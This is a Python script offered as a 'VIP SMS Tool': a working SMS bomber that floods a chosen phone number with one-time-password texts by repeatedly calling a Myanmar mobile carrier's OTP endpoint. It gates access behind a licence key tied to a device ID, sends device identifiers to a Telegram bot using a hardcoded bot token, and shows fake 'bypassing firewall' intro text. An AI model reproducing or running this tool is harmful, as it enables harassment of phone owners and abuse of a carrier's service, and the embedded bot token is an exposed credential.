#!/usr/bin/env python3
import requests, time, sys, hashlib, os, platform, subprocess, json, random

# --- CONFIGURATION ---
BOT_TOKEN = "8700243285:AAEvVldxc_YeDqZ6FItFnWhcg-18kexzFnw"
# Key storage file
KEY_FILE = os.path.join(os.path.expanduser("~"), ".shine_vip_key.json")
# Your Telegram Channel Link
CHANNEL_LINK = "https://t.me/A_ToolsX" 

# Colors
G = "\033[1;32m" # Green
R = "\033[1;31m" # Red
W = "\033[1;37m" # White
Y = "\033[1;33m" # Yellow
C = "\033[1;36m" # Cyan
M = "\033[1;35m" # Magenta
X = "\033[0m"    # Reset

def clear_screen():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def beep(count=1, delay=0.1):
    for _ in range(count):
        sys.stdout.write('\a')
        sys.stdout.flush()
        if count > 1:
            time.sleep(delay)

def typewriter(text, speed=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def transition_anim():
    sys.stdout.write(f"\n{G}[*] Redirecting")
    for _ in range(3):
        time.sleep(0.2)
        sys.stdout.write(".")
        sys.stdout.flush()
    print(f"{X}")

def hacker_intro():
    clear_screen()
    print(G) 
    ascii_art = r"""
    ███████╗██╗  ██╗██╗███╗   ██╗███████╗██╗  ██╗ ██████╗ ██╗  ██╗ ██████╗ 
    ██╔════╝██║  ██║██║████╗  ██║██╔════╝██║ ██╔╝██╔═══██╗██║ ██╔╝██╔═══██╗
    ███████╗███████║██║██╔██╗ ██║█████╗  █████╔╝ ██║   ██║█████╔╝ ██║   ██║
    ╚════██║██╔══██║██║██║╚██╗██║██╔══╝  ██╔═██╗ ██║   ██║██╔═██╗ ██║   ██║
    ███████║██║  ██║██║██║ ╚████║███████╗██║  ██╗╚██████╔╝██║  ██╗╚██████╔╝
    ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
    """
    print(ascii_art)
    time.sleep(0.5)
    
    checks = [
        "INITIALIZING CORE SYSTEMS...",
        "CHECKING NETWORK PROTOCOLS... [OK]",
        "ESTABLISHING SECURE CONNECTION... [SUCCESS]",
        "BYPASSING FIREWALL... [DONE]",
        "DECRYPTING DATABASE... [OK]",
        "LOADING VIRTUAL ENVIRONMENT... [SUCCESS]",
        "HARDWARE ACCELERATION... [ESTABLISHED]",
        "LOCALIZING TARGET SERVERS... [OK]"
    ]
    
    for check in checks:
        print(f"{W}[*]{G} {check}")
        if "OK" in check or "SUCCESS" in check or "DONE" in check:
            beep()
        time.sleep(random.uniform(0.05, 0.15))
    
    print("\n" + f"{W}" + "="*60)
    
    prefix = "STABILIZING ACCESS"
    total = 100
    for i in range(total + 1):
        filled_length = int(30 * i // total)
        bar = '█' * filled_length + '░' * (30 - filled_length)
        sys.stdout.write(f'\r{G}[+] {prefix}: [{bar}] {i}% ')
        sys.stdout.flush()
        time.sleep(0.02)
    
    beep(2, 0.1)
    print("\n" + f"{W}" + "="*60 + "\n")
    
    typewriter(f"{C}>>> Loading VIP Access Panels...", 0.04)
    typewriter(f"{C}>>> Accessing Secure Layer...", 0.04)
    typewriter(f"{C}>>> Authentication Required. Please provide your VIP Key.", 0.04)
    time.sleep(0.5)
    print(X)

def get_model():
    try:
        model = subprocess.getoutput('getprop ro.product.model').strip()
        if not model or "not found" in model.lower():
            model = platform.machine()
        return model
    except:
        return platform.system()

def get_id():
    try:
        serial = subprocess.getoutput('getprop ro.serialno').strip()
        android_id = subprocess.getoutput('settings get secure android_id').strip()
        cpu = subprocess.getoutput('getprop ro.product.cpu.abi').strip()
        if "not found" in serial.lower() or not serial:
            serial = platform.node()
        if "not found" in android_id.lower() or not android_id:
            android_id = platform.processor()
        combined_info = f"{serial}-{android_id}-{cpu}-{platform.machine()}"
        return "DEV-" + hashlib.md5(combined_info.encode()).hexdigest().upper()[:8]
    except:
        return "DEV-" + hashlib.md5(platform.node().encode()).hexdigest().upper()[:8]

def loading_bar(iteration, total, prefix='Sending', length=30):
    percent = ("{0:.1f}").format(100 * (iteration / float(total)))
    filled_length = int(length * iteration // total)
    bar = '█' * filled_length + '░' * (length - filled_length)
    sys.stdout.write(f'\r{G}[*] {prefix}... [{bar}] {percent}% {X}')
    sys.stdout.flush()
    if iteration == total:
        print()
        beep(3, 0.05)

def banner():
    clear_screen()
    print(f"{G}")
    print(r"  ____  _   _ ___ _   _ _____   _  _____  _  _____  ")
    print(r" / ___|| | | |_ _| \ | | ____| | |/ / _ \| |/ / _ \ ")
    print(r" \___ \| |_| || ||  \| |  _|   | ' / | | | ' / | | |")
    print(r"  ___) |  _  || || |\  | |___  | . \ |_| | . \ |_| |")
    print(r" |____/|_| |_|___|_| \_|_____| |_|\_\___/|_|\_\___/ ")
    print(f"\n          {Y}>>> {W}ShineKoko VIP SMS Tool {Y}<<<{X}")
    print(f"{W}╔══════════════════════════════════════════════════╗")
    d_id = get_id()
    model = get_model()
    print(f"  {G}•{W} Device ID : {C}{d_id}{W}")
    print(f"  {G}•{W} Model     : {W}{model}{W}")
    
    saved = get_saved_key()
    if is_key_valid(saved, d_id):
        key = saved["key"]
        if "-H1" in key:
            status = "Active (1 Hour)"
        else:
            days = key.split("-D")[-1]
            status = f"Active ({days} Days)"
        print(f"  {G}•{W} VIP Status: {G}{status}{W}")
    else:
        print(f"  {G}•{W} VIP Status: {R}Inactive{W}")
        
    print(f"{W}╚══════════════════════════════════════════════════╝{X}")
    return d_id, model

def save_key(key):
    data = {"key": key, "activated_at": time.time()}
    try:
        with open(KEY_FILE, "w") as f:
            json.dump(data, f)
    except: pass

def get_saved_key():
    if os.path.exists(KEY_FILE):
        try:
            with open(KEY_FILE, "r") as f:
                return json.load(f)
        except: pass
    return None

def is_key_valid(key_data, d_id):
    if not key_data: return False
    key = key_data.get("key", "")
    activated_at = key_data.get("activated_at", 0)
    
    if not (key.startswith("SHINE-") and d_id in key):
        return False
        
    try:
        if "-H1" in key:
            expiry_time = activated_at + 3600
        else:
            days = int(key.split("-D")[-1])
            expiry_time = activated_at + (days * 24 * 60 * 60)
        return time.time() < expiry_time
    except: pass
    return False

def send_tg(d_id, model):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        resp = requests.get(url).json()
        if resp.get("result"):
            chat_id = resp["result"][-1]["message"]["chat"]["id"]
            msg = (f"🚨 New VIP Request 🚨\n"
                   f"Model: {model}\n"
                   f"ID: {d_id}\n\n"
                   f"Keys:\n"
                   f"1D: SHINE-{d_id}-D1\n"
                   f"3D: SHINE-{d_id}-D3\n"
                   f"5D: SHINE-{d_id}-D5\n"
                   f"7D: SHINE-{d_id}-D7\n"
                   f"15D: SHINE-{d_id}-D15\n"
                   f"30D: SHINE-{d_id}-D30")
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": chat_id, "text": msg})
    except: pass

def auth(d_id, model):
    saved = get_saved_key()
    if is_key_valid(saved, d_id):
        print(f"{G}[+] VIP Session Restored!{X}")
        beep()
        time.sleep(1)
        return True
        
    # Send notification for new request
    send_tg(d_id, model)
    
    while True:
        banner()
        print(f"{Y}[!] Access Required!{X}")
        print(f"{W}1. Take a screenshot of this screen.{X}")
        print(f"{W}2. Send the screenshot to our Telegram Channel.{X}")
        print(f"{W}3. Make sure your Device ID is visible: {C}{d_id}{X}")
        print(f"{W}4. The Bot will auto-generate your VIP Key.{X}")
        print(f"\n{G}Channel: {CHANNEL_LINK}{X}")
        
        key = input(f"\n{W}[?]{G} Enter VIP Key: {W}").strip()
        if is_key_valid({"key": key, "activated_at": time.time()}, d_id):
            save_key(key)
            print(f"{G}[+] Key Accepted!{X}")
            beep(2, 0.1)
            time.sleep(1)
            return True
        print(f"{R}[!] Invalid or Expired Key!{X}")
        beep()
        time.sleep(2)

def send_otp(p, c):
    url = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={}"
    print(f"\n{W}[*] Starting SMS Bomber for {C}{p}{W}...")
    loading_bar(0, c)
    for i in range(c):
        try:
            requests.get(url.format(p), timeout=5)
        except: pass
        loading_bar(i + 1, c)
        time.sleep(0.05)
    print(f"\n{G}[+] Process Finished Successfully!{X}")
    input(f"\n{W}Press Enter to return to menu...{X}")

def show_profile(d_id):
    saved = get_saved_key()
    clear_screen()
    print(f"{G}")
    print("  ╔══════════════════════════════════════════╗")
    print("  ║         " + W + "USER VIP PROFILE DASHBOARD" + G + "       ║")
    print("  ╠══════════════════════════════════════════╣")
    
    if is_key_valid(saved, d_id):
        key = saved["key"]
        activated_at = saved["activated_at"]
        if "-H1" in key:
            expiry_time = activated_at + 3600
            bal = "1 Hour"
        else:
            days = int(key.split("-D")[-1])
            expiry_time = activated_at + (days * 24 * 60 * 60)
            bal = f"{days} Days"
            
        remaining = expiry_time - time.time()
        rem_h = int(remaining // 3600)
        rem_m = int((remaining % 3600) // 60)
        rem_s = int(remaining % 60)
        
        print(f"  ║ {W}• Device ID  : {C}{d_id:<24}{G} ║")
        print(f"  ║ {W}• VIP Key    : {C}{key[:20]+'...':<24}{G} ║")
        print(f"  ║ {W}• Status     : {G}{'ACTIVE':<24}{G} ║")
        print(f"  ║ {W}• Balance    : {Y}{bal:<24}{G} ║")
        print(f"  ║ {W}• Expires In : {M}{str(rem_h)+'H '+str(rem_m)+'M '+str(rem_s)+'S':<24}{G} ║")
    else:
        print(f"  ║ {W}• Device ID  : {C}{d_id:<24}{G} ║")
        print(f"  ║ {R}• [!] No active VIP key found.           {G} ║")
    
    print("  ╚══════════════════════════════════════════╝")
    print(X)
    input(f"\n{W}Press Enter to return to menu...{X}")

def main_menu(d_id, model):
    while True:
        banner()
        print(f"  {W}╔══════════════════════════════════════╗")
        print(f"  ║ {G}[1]{W} SMS TOOL (START BOMBING)        ║")
        print(f"  ║ {G}[2]{W} MY PROFILE (ACCOUNT INFO)       ║")
        print(f"  ║ {R}[0]{W} EXIT SYSTEM                     ║")
        print(f"  ╚══════════════════════════════════════╝")
        
        choice = input(f"\n{W}[?]{G} Select Option: {W}").strip()
        
        if choice == '1':
            transition_anim()
            while True:
                banner()
                print(f"  {Y}--- SMS BOMBING PANEL ---{X}")
                p = input(f"\n{W}[?]{G} Enter Target Phone {W}(or {R}'b'{W} to back): {C}")
                if p.lower() == 'b': 
                    transition_anim()
                    break
                if not p.isdigit() or len(p) < 7:
                    print(f"{R}[!] Invalid Phone Number!{X}")
                    beep()
                    time.sleep(1)
                    continue
                try:
                    c = int(input(f"{W}[?]{G} Enter Request Count: {W}"))
                    send_otp(p, c)
                    transition_anim()
                except ValueError:
                    print(f"{R}[!] Invalid count.{X}")
                    beep()
                    time.sleep(1)
        elif choice == '2':
            transition_anim()
            show_profile(d_id)
            transition_anim()
        elif choice == '0':
            print(f"\n{Y}[!] Exiting... Thank you for using ShineKoko VIP!{X}")
            beep(2, 0.05)
            sys.exit()
        else:
            print(f"{R}[!] Invalid Choice{X}")
            beep()
            time.sleep(1)

if __name__ == '__main__':
    try:
        hacker_intro()
        d_id = get_id()
        model = get_model()
        if auth(d_id, model):
            transition_anim()
            main_menu(d_id, model)
    except KeyboardInterrupt:
        print(f"\n\n{R}[!] Interrupted by user. Exiting...{X}")
    except Exception as e:
        print(f"\n{R}[!] Critical Error: {e}{X}")
